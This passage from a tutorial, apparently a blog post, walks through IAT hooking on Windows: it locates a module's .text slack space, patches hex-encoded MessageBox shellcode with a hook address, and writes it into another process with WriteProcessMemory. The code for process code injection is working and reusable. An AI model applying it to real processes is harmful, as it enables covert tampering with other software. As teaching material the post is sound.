font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">WideCharToMultiByte</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">CP_ACP</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pwBaseDllName</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseDllName</span>.<span style="color:#010001">Length</span>
+ 2, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pBaseDllName</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">sBaseDllName</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span>
(!<span style="color:#010001">_stricmp</span>(<span style="color:#010001">pBaseDllName</span>,
<span style="color:#010001">pModuleName</span>))</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
<span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">BaseAddress</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">fLink</span>
= <span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">InLoadOrderModuleList</span>.<span style="color:#010001">Flink</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <span style="color:blue">while</span> (<span style="color:#010001">pModule</span>-&gt;<span style="color:#010001">InLoadOrderModuleList</span>.<span style="color:#010001">Flink</span> != <span style="color:#010001">firstFLink</span>);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> 0;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">}</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">Now we need a good place within the .text section to inject our
code. Fortunately for us, the raw size of the .text section must be a multiple
of the file alignment specified in the portable executable optional header.
Unless the actual size of the code is divisible by the file alignment, there
will probably be enough space at the end of the .text section to allow for
injection of a small piece of code.</span><span style="font-size:13.5pt;
font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">The code
below can be used to acquire an absolute address that will place the injected
code at the end of the import module’s .text section. </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">DWORD</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">dwHandlerAddress</span>
= (<span style="color:#010001">DWORD</span>)<span style="color:#010001">pImportImageBase</span>
+ </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImportTextHeader</span>-&gt;<span style="color:#010001">VirtualAddress</span> + </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pImportTextHeader</span>-&gt;<span style="color:#010001">SizeOfRawData</span> - </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">dwHandlerSize</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">To function properly, the code injected at the calculated address
must be position-independent. In this proof of concept I will be using my
windows messagebox shellcode with a couple modifications, namely a function
prologue and epilogue along with a jump to 0xDEADBEEF. The assembly
(handler.asm in the sample project) is assembled using NASM and then converted
into a hex escaped C string.</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:blue">char</span><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">* <span style="color:#010001">handler</span> =</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x55\x31\xdb\xeb\x55\x64\x8b\x7b"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x47\x08\x8b\x77\x20\x8b\x3f\x80"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x7e\x0c\x33\x75\xf2\x89\xc7\x03"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x78\x3c\x8b\x57\x78\x01\xc2\x8b"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x7a\x20\x01\xc7\x89\xdd\x8b\x34"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xaf\x01\xc6\x45\x8b\x4c\x24\x04"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x39\x0e\x75\xf2\x8b\x4c\x24\x08"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x39\x4e\x04\x75\xe9\x8b\x7a\x24"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xf8\xc3\x68\x4c\x69\x62\x72\x68"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x4c\x6f\x61\x64\xe8\x9c\xff\xff"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xff\x31\xc9\x66\xb9\x33\x32\x51"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x68\x75\x73\x65\x72\x54\xff\xd0"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x50\x68\x72\x6f\x63\x41\x68\x47"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x65\x74\x50\xe8\x7d\xff\xff\xff"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x59\x59\x59\x68\xf0\x86\x17\x04"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xc1\x2c\x24\x04\x68\x61\x67\x65"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x42\x68\x4d\x65\x73\x73\x54\x51"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xff\xd0\x53\x53\x53\x53\xff\xd0"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\xb9\x07\x00\x00\x00\x58\xe2\xfd"</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#A31515">"\x5d\xb8\xef\xbe\xad\xde\xff\xe0"</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;
color:black">Before our handler is injected 0xDEADBEEF must be replaced with
the address of the function we are hooking. The function below does just that
when supplied with the appropriate variables.</span><span style="font-size:
13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">BOOL</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> <span style="color:#010001">PatchDWORD</span>(<span style="color:#010001">BYTE</span>* <span style="color:#010001">pBuffer</span>, <span style="color:#010001">DWORD</span> <span style="color:#010001">dwBufferSize</span>,
<span style="color:#010001">DWORD</span> <span style="color:#010001">dwOldValue</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <span style="color:#010001">DWORD</span>
<span style="color:#010001">dwNewValue</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">{</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">for</span> (<span style="color:blue">int</span> <span style="color:#010001">i</span> = 0; <span style="color:#010001">i</span> &lt; <span style="color:#010001">dwBufferSize</span>
- 4; <span style="color:#010001">i</span>++)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">if</span> (*(<span style="color:#010001">PDWORD</span>)(<span style="color:#010001">pBuffer</span>
+ <span style="color:#010001">i</span>) == <span style="color:#010001">dwOldValue</span>)</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">memcpy</span>(<span style="color:#010001">pBuffer</span> + <span style="color:#010001">i</span>,
&amp;<span style="color:#010001">dwNewValue</span>, 4);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span>
<span style="color:#010001">TRUE</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:blue">return</span> <span style="color:#010001">FALSE</span>;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9"><span style="font-size:10.0pt;font-family:&quot;Courier New&quot;">}</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black"><br>
</span><span style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;color:black">Once the
handler code is patched up it can be injected and the import address can be
modified to point to it.</span><span style="font-size:13.5pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;
color:black"><br>
<br>
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:green">// Write handler to .text section</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:#010001">bSuccess</span><span style="font-size:
10.0pt;font-family:&quot;Courier New&quot;"> = <span style="color:#010001">WriteProcessMemory</span></span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">(</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">hProcess</span>,</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (<span style="color:#010001">LPVOID</span>)<span style="color:#010001">dwHandlerAddress</span>, </span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">pHandlerBuffer</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#010001">dwHandlerSize</span>,
</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">);</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;">&nbsp;</span></p>

<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;background:#D9D9D9;text-autospace:none"><span style="font-size:10.0pt;
font-family:&quot;Courier New&quot;;color:blue">if</span><span style="font-size:10.0pt;
